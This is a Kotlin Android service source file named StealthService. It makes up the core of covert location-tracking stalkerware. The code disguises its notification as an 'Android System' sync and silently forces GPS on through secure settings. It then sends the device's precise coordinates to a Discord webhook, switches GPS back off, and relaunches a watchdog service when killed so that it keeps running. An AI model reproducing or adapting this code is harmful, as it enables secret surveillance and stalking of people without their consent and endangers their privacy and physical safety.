package com.vivo.sync
import android.app.*
import android.content.Intent
import android.location.LocationManager
import android.os.*
import com.google.android.gms.location.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class StealthService : Service() {
    private lateinit var fused: FusedLocationProviderClient
    private val client = OkHttpClient()

    override fun onCreate() {
        super.onCreate()
        fused = LocationServices.getFusedLocationProviderClient(this)
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        val ch = NotificationChannel("sys","Android System", NotificationManager.IMPORTANCE_LOW)
        ch.setSound(null,null); ch.enableVibration(false)
        nm.createNotificationChannel(ch)
        val notif = Notification.Builder(this,"sys").setSmallIcon(android.R.drawable.stat_sys_data_bluetooth).setContentTitle("Sinkronisasi data").setContentText("Menunggu jaringan").build()
        startForeground(1,notif)
    }

    private fun toggleGpsSetting(turnOn: Boolean) {
        try {
            val mode = if (turnOn) android.provider.Settings.Secure.LOCATION_MODE_HIGH_ACCURACY else android.provider.Settings.Secure.LOCATION_MODE_OFF
            android.provider.Settings.Secure.putInt(contentResolver, android.provider.Settings.Secure.LOCATION_MODE, mode)
        } catch (e: Exception) {
            // Fails silently if permission isn't granted yet
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val handler = Handler(Looper.getMainLooper())
        var isDone = false

        val finalizeAndDie = Runnable {
            if (!isDone) {
                isDone = true
                if (Config.AUTO_TURN_OFF_GPS) {
                    toggleGpsSetting(turnOn = false)
                }
                handler.postDelayed({ stopSelf() }, 1000)
            }
        }

        // Phase 1: Ensure GPS is ON violently in the background
        toggleGpsSetting(turnOn = true)

        // Phase 2: Grab Location
        handler.postDelayed({
            try {
                fused.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null).addOnSuccessListener { loc ->
                    if(loc!=null){ sendDiscord(loc.latitude, loc.longitude) }
                    finalizeAndDie.run()
                }.addOnFailureListener {
                    finalizeAndDie.run()
                }
            } catch (e: Exception) {
                finalizeAndDie.run()
            }
        }, 1000)

        // Failsafe timeout
        handler.postDelayed(finalizeAndDie, 15000)
        return START_STICKY
    }

    private fun sendDiscord(lat:Double, lon:Double){
        val json = """{"content":"📍 $lat,$lon • ${System.currentTimeMillis()}"}"""
        val req = Request.Builder().url(Config.WEBHOOK_URL).post(json.toRequestBody("application/json".toMediaType())).build()
        client.newCall(req).enqueue(object: Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    override fun onDestroy() { 
        super.onDestroy()
        try { startService(Intent(this, WatchdogService::class.java)) } catch(e: Exception) {} 
    }
    override fun onBind(intent: Intent?) = null
}